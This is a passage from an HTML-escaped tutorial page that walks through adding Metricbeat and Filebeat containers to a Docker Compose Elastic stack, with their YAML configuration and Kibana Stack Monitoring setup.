&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./metricbeat.yml:/usr/share/metricbeat/metricbeat.yml:ro&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/var/run/docker.sock:/var/run/docker.sock:ro&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/sys/fs/cgroup:/hostfs/sys/fs/cgroup:ro&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/proc:/hostfs/proc:ro&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/:/hostfs:ro&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;environment&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;ELASTIC_USER=elastic&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;ELASTIC_PASSWORD=${ELASTIC_PASSWORD}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;ELASTIC_HOSTS=https://es01:9200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;KIBANA_HOSTS=http://kibana:5601&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;LOGSTASH_HOSTS=http://logstash01:9600&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&#34;metricbeatyml&#34;&gt;
  metricbeat.yml
  &lt;a href=&#34;#metricbeatyml&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;yml&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;metricbeat.config.modules&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;path&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;${path.config}/modules.d/*.yml&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;reload.enabled&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;metricbeat.modules&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;- &lt;span style=&#34;color:#f92672&#34;&gt;module&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;elasticsearch&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;xpack.enabled&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;period&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10s&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;hosts&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;${ELASTIC_HOSTS}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;username&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;${ELASTIC_USER}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;password&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;${ELASTIC_PASSWORD}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;ssl.certificate_authorities&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;certs/ca/ca.crt&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;ssl.certificate&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;certs/es01/es01.crt&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;ssl.key&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;certs/es01/es01.key&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;- &lt;span style=&#34;color:#f92672&#34;&gt;module&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;logstash&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;xpack.enabled&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;period&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10s&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;hosts&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;${LOGSTASH_HOSTS}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;- &lt;span style=&#34;color:#f92672&#34;&gt;module&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;kibana&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;metricsets&lt;/span&gt;: 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - &lt;span style=&#34;color:#ae81ff&#34;&gt;stats&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;period&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10s&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;hosts&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;${KIBANA_HOSTS}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;username&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;${ELASTIC_USER}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;password&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;${ELASTIC_PASSWORD}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;xpack.enabled&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;- &lt;span style=&#34;color:#f92672&#34;&gt;module&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;docker&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;metricsets&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;container&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cpu&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;diskio&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;healthcheck&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;info&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;#- &amp;#34;image&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;memory&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;network&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;hosts&lt;/span&gt;: [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;unix:///var/run/docker.sock&amp;#34;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;period&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10s&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;enabled&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;processors&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#f92672&#34;&gt;add_host_metadata&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;~&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#f92672&#34;&gt;add_docker_metadata&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;~&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;output.elasticsearch&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;hosts&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;${ELASTIC_HOSTS}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;username&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;${ELASTIC_USER}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;password&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;${ELASTIC_PASSWORD}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;ssl&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;certificate&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;certs/es01/es01.crt&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;certificate_authorities&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;certs/ca/ca.crt&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;key&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;certs/es01/es01.key&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Disable &lt;code&gt;metricbeat.yml&lt;/code&gt; execution permission and restart composer&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;bash&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chmod go-w metricbeat.yml
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker compose up&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Now add out-of-the-box rules.&lt;/p&gt;
&lt;p&gt;Go to: Menu &amp;gt; Management &amp;gt; Stack Monitoring&lt;/p&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020241205125023.png&#34;   /&gt;
  &lt;/figure&gt;

&lt;p&gt;Here, official guide suggests &lt;code&gt;Set up monitoring with Metricbeat&lt;/code&gt; but it didn&amp;rsquo;t find anything automatically, so I went with manual configuration.&lt;/p&gt;
&lt;p&gt;after configuring this step you should see the following in monitoring tab&lt;/p&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/Pasted%20image%2020241205125211.png&#34;   /&gt;
  &lt;/figure&gt;


&lt;h3 id=&#34;filebeat&#34;&gt;
  Filebeat
  &lt;a href=&#34;#filebeat&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;Now that this cluster is stable and monitored with Metricbeat, we can install Filebeat for log ingestion.&lt;/p&gt;

&lt;h4 id=&#34;docker-composeyml-3&#34;&gt;
  docker-compose.yml
  &lt;a href=&#34;#docker-composeyml-3&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;
&lt;p&gt;Append the following to &lt;code&gt;docker-compose.yml&lt;/code&gt;&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;yml&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;filebeat01&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;depends_on&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;es01&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       &lt;span style=&#34;color:#f92672&#34;&gt;condition&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;service_healthy&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;image&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;docker.elastic.co/beats/filebeat:${STACK_VERSION}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;user&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;root&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;volumes&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;certs:/usr/share/filebeat/certs&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;filebeatdata01:/usr/share/filebeat/data&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./filebeat_ingest_data/:/usr/share/filebeat/ingest_data/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./filebeat.yml:/usr/share/filebeat/filebeat.yml:ro&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/var/lib/docker/containers:/var/lib/docker/containers:ro&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/var/run/docker.sock:/var/run/docker.sock:ro&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;environment&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;ELASTIC_USER=elastic&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;ELASTIC_PASSWORD=${ELASTIC_PASSWORD}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;ELASTIC_HOSTS=https://es01:9200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;KIBANA_HOSTS=http://kibana:5601&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     - &lt;span style=&#34;color:#ae81ff&#34;&gt;LOGSTASH_HOSTS=http://logstash01:9600&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&#34;filebeatyml&#34;&gt;
  filebeat.yml
  &lt;a href=&#34;#filebeatyml&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;yml&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;filebeat.inputs&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;- &lt;span style=&#34;color:#f92672&#34;&gt;type&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;filestream&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;id&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;default-filestream&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;paths&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - &lt;span style=&#34;color:#ae81ff&#34;&gt;ingest_data/*.log&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;filebeat.autodiscover&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;providers&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   - &lt;span style=&#34;color:#f92672&#34;&gt;type&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;docker&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;hints.enabled&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;processors&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;- &lt;span style=&#34;color:#f92672&#34;&gt;add_docker_metadata&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;~&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;setup.kibana&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;host&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;${KIBANA_HOSTS}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;username&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;${ELASTIC_USER}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;password&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;${ELASTIC_PASSWORD}&lt;/span&gt;
